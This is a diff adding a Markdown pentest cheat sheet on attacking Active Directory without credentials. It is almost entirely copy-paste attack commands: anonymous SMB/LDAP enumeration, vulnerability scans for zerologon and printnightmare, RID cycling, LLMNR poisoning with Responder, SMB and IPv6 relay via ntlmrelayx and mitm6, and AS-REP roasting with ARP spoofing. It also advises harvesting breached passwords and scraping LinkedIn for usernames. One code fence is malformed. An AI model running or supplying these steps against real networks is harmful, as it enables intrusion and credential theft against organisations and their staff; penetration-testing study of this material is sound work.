@@ -1,0 +1,247 @@
+---
+layout: ../../../../layouts/NoteLayout.astro
+title: Enumeration without credentials
+category: Active Directory Security
+subcategory: Enumeration
+---
+
+
+# Introduction
+
+most of the time when you're hacking an AD environment, you are just with your kali, no user no password. Here is what to do to get your first user!
+
+# Find Domain Controllers
+
+```shell
+nslookup domain.com
+nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com
+nltest /dclist:domain.com
+Get-ADDomainController -filter * | Select-Object name
+gpresult /r
+$Env:LOGONSERVER 
+echo %LOGONSERVER%
+```
+
+# Scanning For Known Vulnerabilites
+
+```shell
+nxc smb 10.10.10.123 -u '' -p '' -M zerologon -M printnightmare -M smbghost
+
+nxc smb 10.10.10.123 -u '' -p '' -M coerce_plus
+```
+Check out what other modules are available via `nxc <protocol> -L`
+
+
+# SMB Anonymous Access
+shares, users, password policies and groups enumeration.
+
+```shell
+nxc smb 10.10.10.123
+
+nxc smb 10.10.10.123 -u '' -p ''
+nxc smb 10.10.10.123 -u '' -p '' --shares
+nxc smb 10.10.10.123 -u '' -p '' --pass-pol
+nxc smb 10.10.10.123 -u '' -p '' --users
+nxc smb 10.10.10.123 -u '' -p '' --groups
+
+nxc smb 10.10.10.123 -u 'a' -p '' 
+nxc smb 10.10.10.123 -u 'a' -p '' --shares
+```
+
+```shell
+# Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing. List format is one IP per line
+
+nxc smb 10.10.10.0/24 --gen-relay-list relay_list.txt
+```
+
+
+```shell
+enum4linux-ng -A 10.10.10.123
+
+enum4linux-ng -A 10.10.10.123 -u 'guest' -p ''
+```
+
+```shell
+smbmap -u "" -p "" -P 445 -H 10.10.10.123
+
+smbmap -u "guest" -p "" -P 445 -H 10.10.10.123
+``
+
+```shell
+smbclient -N -U "" -L \\10.10.10.123
+
+rpcclient -N -U "" -L \\10.10.10.123
+```
+
+
+```shell
+enum4linux-ng -U 10.10.10.123 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+
+## Changing expired password via smbpasswd
+
+-> Identify
+
+```shell
+nxc smb $IP -u users.txt -p pass.txt  
+
+\\ STATUS_PASSWORD_MUST_CHANGE
+```
+
+-> Changing expired password
+
+```shell
+smbpasswd -r <ip> -U <user>
+```
+
+## SMB Relay Attack (SMB signing is disabled)
+
+```shell
+# check if host doesn't require SMB signing using nmap
+
+nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 127.0.0.1
+```
+
+Off SMB and HTTP in `/etc/responder/Responder.conf` then:
+
+```shell
+sudo responder -I tun0 -dwP
+```
+then:
+
+```shell
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
+
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i # for interactive mode
+```
+then:
+
+```shell
+nc 127.0.0.1 <port specified>
+```
+
+
+# LDAP Anonymous Access
+users, computers and enumeration on any object.
+
+```shell
+nxc ldap 10.10.10.123 -u "" -p "" --users
+```
+
+```shell
+ldapsearch -LLL -x -H ldap://test.local -b '' -s base '(objectclass=\*)'
+
+ldapsearch -H ldaps://test.local/ -x -s base -b '' "(objectClass=*)" "*" +
+```
+
+```shell
+ldapsearch -h 10.10.10.123 -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d " "
+
+windapsearch.py --dc-ip 10.10.10.123 -u "" -U
+```
+
+```shell
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+```shell
+nxc ldap 10.10.10.123 -u "" -p "" --query "(sAMAccountName=Administrator)" ""
+nxc ldap 10.10.10.123 -u "" -p "" --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
+```
+
+```shell
+nxc ldap 10.10.10.123 -u user.txt -p '' --asreproast output.txt
+```
+
+
+```shell
+nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.123
+```
+
+
+
+# RID cycling
+Enumerate users from the Domain Controllers.
+
+
+```shell
+impacket-lookupsid vuln.org/guest@10.10.10.123
+
+impacket-lookupsid anonymous@10.10.10.123
+```
+
+```shell
+kerbrute userenum -d test.local usernames.txt
+
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
+```
+
+```shell
+# https://github.com/trustedsec/ridenum.git
+# Rid Enum is a RID cycling attack that attempts to enumerate user accounts through
+# null sessions and the SID to RID enum. If you specify a password file, it will
+# automatically attempt to brute force the user accounts when its finished enumerating.
+
+./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>
+```
+
+
+```shell
+bloodhound-python -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1
+```
+
+
+# Username Harvesting
+
+We can use a tool such as linkedin2username to scrape data from a company s LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets. and https://github.com/laramies/theHarvester
+
+
+# Credential Hunting
+
+Dehashed is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.
+
+```shell
+sudo python3 dehashed.py -q $DOMAIN.local -p
+```
+
+# LLMNR Poisioning
+
+```shell
+sudo responder -I eth0 -dwvP
+
+# Technique to capture NTLMv1 challenges/responses for easier cracking:
+
+sudo responder -I eth0 --lm --disable-ess
+```
+
+
+# IPV6 Relay Attack
+
+```shell
+sudo mitm6 -d <domain name>
+
+ntlmrelayx.py -6 -t ldap://<domain controller IP> -wh fakewpad.marvel.local -l lootme
+```
+
+# AS-REP Roasting
+
+An attacker can use a **man-in-the-middle** position to capture AS-REP packets as they traverse the network **without relying on Kerberos pre-authentication being disabled.** It therefore works for all users on the VLAN. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
+
+```shell
+# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher relay -dc $DC_IP
+
+# Disabling ARP spoofing, the mitm position must be obtained differently
+ASRepCatcher relay -dc $DC_IP --disable-spoofing
+
+# Passive listening of AS-REP packets, no packet alteration
+ASRepCatcher listen
+```
+
+Impacket has a tool called "GetNPUsers.py" that will allow us to query ASReproastable accounts from the Key Distribution Center (KDC). The only thing that's necessary to query accounts is a valid set of usernames which was enumerated via Kerbrute.
+
+```bash
+impacket-GetNPUsers -no-pass -usersfile userlist.txt domain.com/
+```
